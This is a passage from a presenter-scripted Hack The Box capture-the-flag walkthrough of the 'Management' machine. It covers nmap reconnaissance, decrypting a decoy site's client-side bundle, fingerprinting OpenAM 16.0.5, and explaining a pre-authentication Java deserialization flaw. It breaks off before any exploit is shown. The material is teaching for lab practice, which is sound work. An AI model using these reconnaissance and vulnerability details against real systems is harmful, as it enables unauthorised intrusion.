<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Management Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a261b8b2-9dd5-4958-aaac-ca53661ab002-1785405942.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author: <a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 14 Oct 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Debrief

> [!tip]+ 🎤 OPENING — SAY THIS FIRST
>
> **OPENING:** Good evening everyone, thanks for being here. Today we take a machine called Management from knowing nothing about it to owning it completely as root, the top administrator. We get in because of a widely used login product that has a known flaw, then we move up because an admin stored a password in a readable file and reused it, and finally because a backup command was trusted a little too much. I hope by the end you will see how all the steps we take chain together.
>
> **THE CATEGORY:** of this box. In plain terms this is mostly a web exploitation box, finished off with a privilege escalation trick. That just means our way in is a web application, and our way to full control is abusing one over-permissive command.
>
> **OUR JOURNEY:** First starts with recon: we knock on the machine's doors to see what is open. Second, enumeration: we study the web apps, walk past a decoy, and pin down an exact software version. Third, the foothold: we use a public exploit to land our first shell. Fourth, lateral movement: we loot a second app's config to steal a password and become a real user. Fifth, privilege escalation: we abuse a backup tool to read the root user's files. 
> 
> If you are new to the Cyber Shujaa CTF walkthroughs karibu sana, stop me any time and I will slow down for your questions or if you need clarification.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Before we can touch the target we have to be on the same network as it. Hack The Box gives each of us a personal VPN file, which is just a secure tunnel that drops our attacking machine into HTB's private lab network. We start that tunnel, then we start the target machine from the website.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.

> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **WHILE IT RUNS:** The command sudo openvpn followed by our config file opens that secure tunnel. It sits there printing connection lines and then says Initialization Sequence Completed. That is normal, we leave that window open for the whole session. Nothing else works until this connection is established.
>
> **TRANSITION:** Tunnel is up and the box is started. The first thing any attacker confirms is simply: is the target actually alive and reachable.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Small quality-of-life step. We are going to type the target's address a lot, so instead of retyping those numbers every time, we save the IP into a shortcut name. From here on, when I type dollar-sign I-P, the shell swaps in the real address for me.

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> IP equals the target address just stores it under the name IP for this terminal. The echo line prints it straight back so we can confirm it saved. If I ever want to clear it, unset IP wipes that shortcut. One thing to know: this shortcut only lives in this one terminal window, so a brand new terminal will not know it.

To clear the variable:

```bash
unset IP
```

> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **TRANSITION:** Address saved. Now let us make sure the machine is actually awake before we spend time scanning it.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Quick health check. We send the target a handful of tiny test messages and see if it answers. If it does, we know it is online and the path between us and it through the VPN is clean, so a full scan is worth our time.

**Command:** `ping -c 4 TARGET_IP`


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> ping is the tool, and dash c four just means send exactly four test packets then stop, so we get a fast, clean yes-or-no instead of it pinging forever. Each line that comes back is one of our knocks being answered.

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
PING 10.129.244.176 (10.129.244.176) 56(84) bytes of data.
64 bytes from 10.129.244.176: icmp_seq=1 ttl=63 time=232 ms
64 bytes from 10.129.244.176: icmp_seq=2 ttl=63 time=229 ms
64 bytes from 10.129.244.176: icmp_seq=3 ttl=63 time=228 ms
64 bytes from 10.129.244.176: icmp_seq=4 ttl=63 time=203 ms

--- 10.129.244.176 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 202.532/222.833/231.544/11.795 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.

> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point at the screen.] The number that matters is zero percent packet loss. Every test packet went out and came back, so the machine is up and reachable. You may also notice the reply time is around 200 milliseconds, which is just the VPN distance, nothing to worry about.
>
> **TRANSITION:** The machine is alive. The next question every attacker asks is: what is it running. For that we reach for the single most important recon tool, Nmap.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Picture the machine as a huge building with sixty-five thousand numbered doors. Each door is a port, and behind an open one is a service we can talk to. In this first pass we do a fast, wide sweep of every single door just to see which ones are open, because the interesting services on this box hide on unusual high-numbered doors that a lazy scan would miss.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> Here is what the command is doing. nmap is the scanner. dash p dash tells it to check all sixty-five thousand ports, not just the common thousand. min-rate five thousand pushes it to send at least five thousand packets a second so this finishes in seconds. dash capital P n tells it to skip pinging first and just scan, because we already run ours. The little grapo bit at the end is my own shortcut that neatly collects the open port numbers for the next command.

**Breakdown:**

| Component         | Purpose             | Simple Explanation                                                                                                                                                                                                                                 |
| ----------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Port scanner        | Sends packets to each port and classifies the response as open, closed, or filtered.                                                                                                                                                               |
| `-p-`             | Port range          | Shorthand for ports 1–65535. Without it nmap checks only its built-in list of 1000 common ports.                                                                                                                                                   |
| `--min-rate 5000` | Timing floor        | Forces at least 5000 packets per second instead of letting nmap's adaptive timing throttle down. This is what makes a full-range scan finish in seconds rather than minutes. Note the **double** dash.                                             |
| `-Pn`             | Skip host discovery | Treats the host as up without pinging first. HTB machines commonly drop ICMP; without this, nmap may conclude the host is down and scan nothing.                                                                                                   |
| `\| grapo`        | Custom filter       | Local zsh function: `tee /dev/tty \| grep -oP '^\d+(?=/tcp\s+open)' \| paste -sd, \| sed 's/^/\n/'`. Prints the full nmap output to the terminal while extracting open port numbers into a comma-separated list ready to paste into the next scan. |
|                   |                     |                                                                                                                                                                                                                                                    |

**Result:**

```shell
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
1689/tcp  open  firefox
4444/tcp  open  krb524
37441/tcp open  unknown
50389/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 31.45 seconds
```

> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] Seven open doors. Twenty-two is SSH, remote login. Eighty and four-four-three are web, a normal and a secure website. Then look at these oddballs: sixteen-eighty-nine, four-four-four-four, a random high port, and fifty-three-eighty-nine. Those last ones sit well outside the common range, and that is exactly why we scanned everything. You get unusual open doors are they could be where the interesting stuff lives.
>
> **TRANSITION:** Now that we know which seven doors are open, we go back and interview each one properly to learn exactly what software is behind it.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 Fingerprint the seven services


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> This second scan is heavier, but we aim it only at the seven open doors, so it stays quick. It reads version numbers, runs a batch of detection scripts, and coaxes each service into telling us what it really is.

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> dash capital A is the workhorse here: it fingerprints software versions, runs detection scripts, and even traces the network route, all at once. dash p with our seven port numbers keeps all that heavy machinery aimed only at the doors we already know are open. It is basically sitting each service down for an interview.

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
22/tcp    open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (protocol 2.0)
80/tcp    open  http      nginx 1.24.0 (Ubuntu)  -> redirect to https://management.htb/
443/tcp   open  ssl/http  nginx 1.24.0 (Ubuntu)
|  ssl-cert: Subject: CN=management.htb / O=Management Managed Services Ltd
|  Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
1689/tcp  open  java-rmi  Java RMI
|  rmi-dumpregistry: org.opends.server.protocols.jmx.client-unknown
|    javax.management.remote.rmi.RMIServerImpl_Stub  @127.0.1.1:38591
4444/tcp  open  ssl/krb524?  (OpenDJ Administration Connector)
|  ssl-cert: Subject: CN=sso.management.htb / O=Administration Connector RSA Self-Signed Certificate
|  fingerprint: LDAPSearchReq ... ds-root-dse ... ds-cfg-root-dse-backend   (LDAPS)
38591/tcp open  java-rmi  Java RMI
50389/tcp open  ldap      (Anonymous bind OK)
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Before we touch anything, let us translate seven open ports into intent. A port list means nothing until you attach a what-and-why to each one, so here is the table we use to decide where to spend our effort. [Walk the rows in plain words: SSH is the front door, useless without a password. The web ports are our real surface. The Java and admin ports are locked management channels, noise for now. And the last line, the LDAP directory, lets strangers connect without a password, which is our first real lead.]

| Port  | Service  | Version                | Analysis                                                                          | Simple Explanation                                                                        |
| ----- | -------- | ---------------------- | --------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| 22    | SSH      | OpenSSH 9.6p1          | Modern, no public RCE. Credential-only entry point.                               | The front door. Useless until we find a username and password.                            |
| 80    | HTTP     | nginx 1.24.0           | 301 to `https://management.htb/`. Confirms name-based vhosting.                   | Plain web port that just bounces you to the secure one and reveals the real hostname.     |
| 443   | HTTPS    | nginx 1.24.0           | Main site. Cert SAN is wildcard `*.management.htb`.                               | The real website. Its ID card admits other subdomains exist but won’t name them.          |
| 1689  | Java RMI | OpenDJ JMX             | Registry dump names OpenDJ, points to the dynamic RMI port. Refuses unauth use.   | A management channel for the directory server. Locked, but it confirms what’s running.    |
| 4444  | LDAPS    | OpenDJ Admin Connector | Secure admin endpoint, refuses anonymous ops. Cert CN leaks `sso.management.htb`. | A locked admin line, but its certificate accidentally prints the hidden subdomain’s name. |
| 38591 | Java RMI | (dynamic)              | Secondary JMX endpoint tied to the JVM. Changes each reboot. Noise.               | A second locked management channel. Ignore it.                                            |
| 50389 | LDAP     | OpenDJ config store    | Anonymous bind accepted. Non-standard port. The reconnaissance jackpot.           | The directory database lets strangers connect without a password. Worth a closer look.    |

> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** The takeaway is simple: everything interesting on this box is a Java-based identity system reached over the web. So our next move is to actually open those websites and see what we are dealing with.
>
> **TRANSITION and PHASE 1 RECAP:** Where are we now? We are on the network, the box is alive, we found seven open doors, pinned the box as an OpenAM identity platform, and even learned a hidden hostname for free. That closes recon. Next we enumerate the web apps.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.5 Resolve the virtual hosts and identify the web front-ends

**Why this step:** The port scan proved name-based virtual hosting (port 80 redirects to a hostname, the 443 cert carries a wildcard SAN, and the 4444 cert disclosed `sso.management.htb`). Before any hostname-based request will work, those names must resolve to the target locally.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> One setup step before the browser. The server hosts more than one site on the same address and only answers to the right name, but our computer does not know those names yet. So we add them to our local address book, and only then can we open both sites to see what they are.

**Command:**

```shell
echo "TARGET_IP management.htb sso.management.htb" | sudo tee -a /etc/hosts
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> That echo line writes one entry into slash etc slash hosts, which is just our computer's private address book, mapping both management dot h-t-b and the hidden sso name to the target's address. The sudo tee dash a part is what lets us append that line with admin rights without erasing what is already there.

**Breakdown:**

- `echo "TARGET_IP management.htb sso.management.htb"` builds one hosts-file line mapping both names to the target.
- `| sudo tee -a /etc/hosts` appends that line to `/etc/hosts` with root privileges (`-a` = append, so existing entries are preserved).

**Result (IP scrubbed):**

```
TARGET_IP management.htb sso.management.htb
```

> [!tip]+ 🎤
>
> Both hostnames should now resolve, and both load in the browser after accepting the self-signed certificate warning:

- `https://management.htb/` serves a corporate marketing site for “Management Managed Services Ltd.” Its copy advertises managed “identity, service desk, monitoring and backup.” 

![[management-landing.png]]

- `https://sso.management.htb/` issues a redirect into `/openam/XUI/` and presents an **OpenAM Community Edition** sign-in page. 

![[openam-login.png]]


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** Now both load in the browser. The main site is a corporate page for Managed Services, and readind its own tagline: it runs identity, service desk, monitoring and backup. Keep those four words in mind, because every one of them is a real piece of this box later. The sso site bounces us into an OpenAM login page, and that is the real application we are here for.
>
> **CONCEPT BOX — what virtual hosting is:** Plain version: one physical server can run many different websites, like one mall holding many shops, and it decides which shop to show you based on the name you ask for, instead of the room plus floor number. That's how this server is housing/hosting Two distinct web applications on one IP.
>
> **TRANSITION:** Two sites, two very different jobs. Let us enumerate the main one first and find out if it is real or a distraction.

**What this gives you:** Two distinct web applications on one IP. **Key finding:** the real application surface is the OpenAM identity platform at `https://sso.management.htb/openam`; the main site is a separate, static-looking marketing front-end whose copy foreshadows the service stack (identity, service desk, backup).

**Next:** Fingerprint and content-enumerate the main site first, confirming whether it holds anything actionable or is purely a front, before pivoting to OpenAM.
<div align="center">
<br>
<br>
</div>

#### OpenAM (OH-pen-ay-em)

**OpenAM** is an open-source Identity and Access Management (IAM) platform. Think of it as the head of security for an organization’s web applications: instead of every app handling its own logins, they all delegate to OpenAM, which decides who you are and what you’re allowed to touch.

What it actually does, in plain terms:

- **Authentication** - it verifies identity (checks your username/password, MFA, etc.), often against a directory like LDAP. That directory on this box is the OpenDJ store you already found on port 50389.
- **Single Sign-On (SSO)** - log in once, and you get access to every connected app without logging in again. That’s why the subdomain here is literally named `sso`.
- **Authorization and policy** - it enforces rules about which users can reach which resources.
- **Federation** - it lets separate organizations trust each other’s logins (SAML, OAuth/OpenID Connect), so a user from company A can access company B’s app.

A bit of lineage, because it explains why it matters for us: OpenAM started at Sun Microsystems, passed to Oracle, then ForgeRock, and the version here is the community fork maintained by the OpenIdentityPlatform project. It’s a large, old, Java web application that runs on Tomcat. That combination (big Java codebase, long history, lots of legacy endpoints) is exactly why experienced players perk up when they see OpenAM on a box: it has a rich history of Java-specific vulnerabilities. We’ll get to its version and what that unlocks once we’ve closed out the main-site decoy.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Fingerprint and content-enumerate the main site

**Why this step:** With the main site identified as a separate front-end from OpenAM, enumerate it on its own terms (technology, hidden content, page construction) before deciding whether it is in-scope for the attack chain or a decoy.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> We treat the main site as a separate target for a moment. We fingerprint what it is built from, brute-force it for hidden pages, and read its raw source, all before deciding whether it matters or is just there to waste our time.

**Commands/Actions:**

```shell
whatweb -a3 https://management.htb
feroxbuster -u https://management.htb -k -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
curl -k https://management.htb
```

- Wappalyzer: 

![[management-landing-wappalyzer.png]]

You could also open the page source in the browser (Ctrl+U) and skim for anything interesting: HTML comments, linked JS bundles, hidden paths, or credentials a developer left behind.


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> whatweb identifies the technology behind the site. feroxbuster rapidly guesses thousands of hidden folder names to find pages not linked anywhere. And the curl line pulls the page's raw code so we can read how it is actually put together, without the browser prettifying it.

**Breakdown:**

- `whatweb -a3` fingerprints the stack at aggression level 3 (a few extra probes for version/plugin detail).
- `feroxbuster ... -k ... -t 50` brute-forces directories over the self-signed TLS endpoint with 50 threads, output saved for the notes.
- `curl -k https://management.htb` pulls the raw HTML so the page construction is visible without a browser rendering it. 

**Result (IP scrubbed):**

```
# whatweb
https://management.htb [200 OK] HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)],
IP[TARGET_IP], Script, Title[Management — Managed IT & Infrastructure], nginx[1.24.0]

# feroxbuster
301   GET   https://management.htb/assets => https://management.htb/assets/
(only /assets discovered across 60k requests)

# curl: key excerpt from the inline loader script
var KEY="C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=", FILE="assets/app.enc";
...
crypto.subtle.importKey("raw", b64(KEY), {name:"AES-GCM"}, false, ["decrypt"])
  .then(k => crypto.subtle.decrypt({name:"AES-GCM", iv: raw.slice(0,12)}, k, raw.slice(12)))
  .then(buf => (0,eval)(new TextDecoder().decode(buf)));
```

The page also sets `<meta name="robots" content="noindex,nofollow">` and loads only `assets/styles.css` plus the inline loader.


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point at the source.] Two things. The page is nearly empty of real content, and it loads an encrypted bundle, then decrypts it right in your browser using a key that is sitting in plain sight in the page code. That is the tell. If the browser can decrypt it, so can we, because we have the key, the locked file, and the method all in front of us.
>
> **CONCEPT BOX — client-side encryption is not protection:** Plain version: imagine a shop that locks its goods in a glass box but tapes the key to the outside of the box. Anyone can open it. Hiding a secret in code the browser runs is exactly that. Depth line: the key and ciphertext are both served to every visitor, so the AES-GCM decryption is pure obfuscation, not security. Real world: developers do this often, thinking minified or encrypted front-end code hides their secrets. It never does.
>
> **PRONOUNCE:** curl = say curl. AES-GCM = say A-E-S G-C-M.
>
> **TRANSITION:** The site is almost certainly a decoy, but we never assume. Let us actually decrypt that bundle and prove there is nothing useful inside.

**What this gives you:** A static Nginx-served marketing site whose entire application is an AES-GCM-encrypted JavaScript bundle (`assets/app.enc`) decrypted in the browser using a **hardcoded key present in the page source**. **Key finding:** client-side encryption with an exposed key offers zero real protection, so the bundle is fully recoverable offline. This is a strong rabbit-hole indicator, but it must be decrypted and inspected to rule it out.

**Next:** Recover and decrypt `app.enc` with the leaked key, then grep the plaintext for endpoints, credentials, or paths before judging the site a dead end.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Decrypt the client-side bundle and rule out the decoy (Section 2: Enumeration)

**Why this step:** The main site’s logic is an AES-GCM-encrypted bundle (`assets/app.enc`) with the decryption key hardcoded in the page source. Because the key is client-side, the bundle is fully recoverable and must be inspected before the site can be dismissed.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> We are going to do exactly what the browser does, but on our side and on purpose. We grab the locked file and the key straight from the page, decrypt it ourselves, and then search the result for anything useful: hidden addresses, passwords, secret paths.

**Command:**

```shell
curl -sk https://management.htb/assets/app.enc | python3 -c '
import sys, base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
raw = base64.b64decode(sys.stdin.read().strip())
key = base64.b64decode("C+XDTUB0EuPY7BE+xzRcMP6dNjWd0h0GPxdt8tWSTVY=")
sys.stdout.write(AESGCM(key).decrypt(raw[:12], raw[12:], None).decode(errors="replace"))
' | grep -ioE '(https?://[^"]+|/[a-z0-9_/.-]+|user|pass|secret|token|api|key)' | sort -u
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> The curl part downloads the encrypted bundle. The little Python script takes the key we copied from the page, splits the file into its two pieces the way the browser did, and decrypts it, printing the real code. Then grep sifts that output for anything that looks like a web address, a path, or the words user, pass, secret, token, or key.

**Breakdown:**

- `curl -sk .../app.enc` fetches the encrypted bundle (`-s` silent, `-k` ignore self-signed cert).
- The Python one-liner base64-decodes the blob, splits off the 12-byte IV prefix from the ciphertext, and AES-GCM-decrypts it with the base64-decoded key taken from the page source, writing plaintext to stdout.
- `grep ... | sort -u` extracts any URLs, paths, or credential-like tokens from the decrypted JavaScript.

**Result:**

```
(no matches)
```

Byte count of the decrypted output, confirming the decrypt itself succeeded:

```
63863
```


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] The search comes back empty, and the byte count confirms the decryption actually worked and produced real code. So the whole site is a lovingly built dead end. This is a discipline lesson as much as a technical one: we checked it, we proved it was empty, and now we walk away instead of sinking an hour into it.
>
> **TRANSITION:** Decoy ruled out. The real target was always the login system on the sso site, so let us go identify exactly which version of it we are facing.

**What this gives you:** 62 KB of decrypted front-end JavaScript containing no endpoints, credentials, or paths. **Key finding (dead end):** the main site is a deliberate rabbit hole. Its client-side encryption is cosmetic and its contents are purely cosmetic UI. Nothing here advances the engagement; the real target is the OpenAM application on the `sso` vhost.

**Next:** Pivot to `https://sso.management.htb/openam` and read the login page source to fingerprint the exact OpenAM version, which drives CVE selection.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.3 Fingerprint the OpenAM version from the login page

**Why this step:** With the decoy site ruled out, the OpenAM instance on the `sso` vhost is the real target. Its exact version determines which published vulnerabilities apply, and the XUI single-page app discloses that version in its page source.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> This is the single most important step in the whole box, and it is almost anticlimactic. Login pages are often built in a way that accidentally prints their exact software version right in the page source. We just go read it.

**Command:**

```shell
curl -sk 'https://sso.management.htb/openam/XUI/' | grep -ioE 'urlArgs[^,]*|version[^,<]*' | head
```


> [!tip]+ 🎤 SAY THIS WHILE IT RUNS
>
> The curl grabs the login page's source, and grep pulls out the one line we care about, a setting the page uses to label its version. We are fishing for an exact build number, because that is what turns is-this-thing-vulnerable into here-is-the-exact-exploit.

**Breakdown:**

- `curl -sk 'https://sso.management.htb/openam/XUI/'` fetches the login SPA’s HTML over the self-signed TLS endpoint.
- `grep -ioE 'urlArgs[^,]*|version[^,<]*'` extracts the RequireJS `urlArgs` line (and any `version` strings), case-insensitively.

**Result:**

```
urlArgs : "v=16.0.5"
```

> There it is: **OpenAM 16.0.5**. That one string is the pivot point of the whole box. A precise product and version means we can stop guessing and start researching known vulnerabilities.
> 
> A quick note on why this leaks, because it’s a nice lesson: `urlArgs` is a RequireJS cache-busting parameter. The XUI app appends `?v=16.0.5` to every JavaScript module it loads so browsers don’t serve a stale cached copy after an admin upgrades. Completely harmless as a feature, but it hands an attacker the exact build number for free. Version disclosure through a cache-buster is a classic accidental leak.


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** [Point.] There it is: OpenAM version sixteen point zero point five. One precise number. The reason it leaks is harmless on its own, it is a cache trick that tags every file with the version so your browser does not use a stale copy after an upgrade, but it hands an attacker the exact build for free. From here we stop guessing and start researching known flaws for this exact version.
>
> **CONCEPT BOX — why a version number is gold:** Plain version: knowing the exact model and year of a lock lets a locksmith look up whether that model has a known weakness. Same here. Depth line: OpenAM is a large, old Java application with a long public vulnerability history, so an exact version almost always maps to a documented exploit. Real world: most real breaches start with fingerprinting outdated software and looking up its published flaws, no genius required.
>
> **PRONOUNCE:** OpenAM 16.0.5 = say OpenAM sixteen point oh point five.
>
> **TRANSITION:** Exact version in hand. Now we go hunting for a documented, working way to break this specific build.

**What this gives you:** The exact product build. **Key finding:** this is **OpenAM 16.0.5** (the OpenIdentityPlatform community fork). The version is disclosed via a RequireJS cache-busting parameter, a harmless front-end feature that accidentally exposes the build number.

**Next:** Research known vulnerabilities affecting OpenAM 16.0.5 to select a viable exploitation path.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.4 Research and select a viable CVE


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> **SAY BEFORE:** This is the part of hacking that looks the least like hacking and the most like homework: reading security advisories. We have a product and a version, so the only question is whether the public internet already knows how to break it, and which of the known flaws actually applies to this specific machine.
>
> **WHILE YOU SEARCH:** [Narrate the triage.] A quick search turns up three scary critical findings for this version. The skill is not finding them, it is picking the right one. We judge each by one test: does the broken feature actually exist and is it reachable here without logging in. Two of the three need optional features this box does not use, so they are out. One targets a feature that is on by default and reachable by anyone. That is our winner.

![[Google OpenAM 16.0.5 CVE.png]]

**Why this step:** OpenAM 16.0.5 has a colorful vulnerability history. Multiple pre-auth RCE advisories exist for this version, so they must be triaged by reachability on this specific deployment rather than by severity score.

**Research method:** Search the version against GitHub Advisory Database (GHSA), NVD, GitLab/Snyk advisory mirrors, and the OpenIdentityPlatform release notes. Query terms: `OpenAM 16.0.5 CVE`, `OpenAM pre-auth RCE deserialization`.

**Candidate triage:**

|CVE|Vulnerability|Reachability on this box|Verdict|
|---|---|---|---|
|CVE-2026-33439|Unsafe Java deserialization of the `jato.clientSession` HTTP parameter on legacy JATO ViewBean endpoints (login, password reset)|High. These endpoints ship enabled by default and need no configuration.|**Selected**|
|CVE-2026-45051|Deserialization-of-untrusted-data in the WebAuthn authentication module|Low. Requires WebAuthn to be configured into an auth chain, which this box shows no sign of.|Deferred|
|CVE-2026-46498|Authentication bypass (not RCE)|Uncertain. Advisory does not clearly list 16.0.5; wrong bug class for a shell.|Rejected|
|CVE-2025-67735 / 15284 / 13465|Dependency issues (Netty CRLF, `qs` DoS, Lodash prototype pollution)|N/A. DoS/low impact, fixed in the 16.0.5 release.|Rejected|


> [!tip]+ 🎤 SAY THIS AFTER THE OUTPUT
>
> **SAY AFTER:** The one we pick is a pre-authentication flaw in how OpenAM handles a certain web request. Pre-authentication is the magic phrase: it means we do not need any username or password to trigger it. That is as good as it gets for a way in.
>
> **CONCEPT BOX — what a CVE is:** Plain version: a CVE is just a global ID number for a specific known software flaw, like a recall notice number for a faulty car part, so everyone refers to the same issue. Depth line: the real skill here is triage by reachability over severity score, since a scary nine-out-of-ten flaw is useless if its vulnerable feature is switched off on the target. Real world: defenders and attackers both live in these advisory databases daily.
>
> **PRONOUNCE:** CVE = say C-V-E, Common Vulnerabilities and Exposures. RCE = say R-C-E, Remote Code Execution.
>
> **TRANSITION:** We have chosen our weapon on paper. Before building it, let us confirm the exact pages it targets are actually live on this machine.

**Plain-language summary:** Three “critical RCE” headlines appear for this version, but only one attacks a feature that is turned on by default and reachable without logging in. The deserialization bug in the `jato.clientSession` parameter (CVE-2026-33439) is that one; the others need optional features or are the wrong type of flaw.

**Key finding:** CVE-2026-33439 is the selected path: pre-authentication RCE via Java deserialization of the `jato.clientSession` parameter against legacy JATO endpoints.

**Next:** Confirm those legacy JATO endpoints are actually live and unauthenticated on this deployment before investing in payload construction.
<div align="center">
<br>
<br>
</div>

#### CVE Breakdown

The vulnerability we picked, CVE-2026-33439, is a **Java deserialization** bug. That phrase sounds intimidating, so here it is in plain terms.

Programs often need to save a live object (a chunk of data sitting in memory) to disk or send it across the network. To do that, Java flattens the object into a stream of bytes. That flattening is called **serialization**. **Deserialization** is the reverse: taking those bytes and rebuilding the original object back in memory.

Here is where the danger lives. While Java rebuilds an object from bytes, it automatically runs certain setup methods on the classes it reconstructs. If an attacker gets to supply the bytes, they get to choose which classes are rebuilt and, by extension, which of those automatic methods fire. String enough of these together in the right order and you can steer the program into running a command of your choice. That smuggled sequence of classes is called a **gadget chain**.

OpenAM takes the value of an HTTP parameter named `jato.clientSession`, decodes it, and feeds it straight into Java's deserializer with no checks on which classes are allowed. So an unauthenticated attacker can hand OpenAM a malicious byte blob in that one parameter and have it rebuilt into something that runs code on the server. No login is needed, because the vulnerable pages (login and password reset) are reachable before you sign in.

A bit of history makes it worse: a nearly identical bug was fixed years ago (CVE-2021-35464) on a related parameter, `jato.pageSession`, by adding an allow-list of safe classes. Nobody applied that same fix to `jato.clientSession`, so the hole was left wide open on a parameter sitting right next to the patched one.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.5 Confirm the legacy JATO endpoints are live

**Why this step:** CVE-2026-33439 delivers its payload through legacy JATO ViewBean endpoints. Before building a deserialization payload, verify those endpoints respond without authentication on this deployment.


> [!tip]+ 🎤 SAY THIS BEFORE RUNNING
>
> Our chosen flaw fires through a few specific old pages in OpenAM. Building the full exploit is real effort, so first we do a thirty-second check that those pages actually respond here, with no login. No point forging a key for a door that is bricked up.

**Command:**

```shell
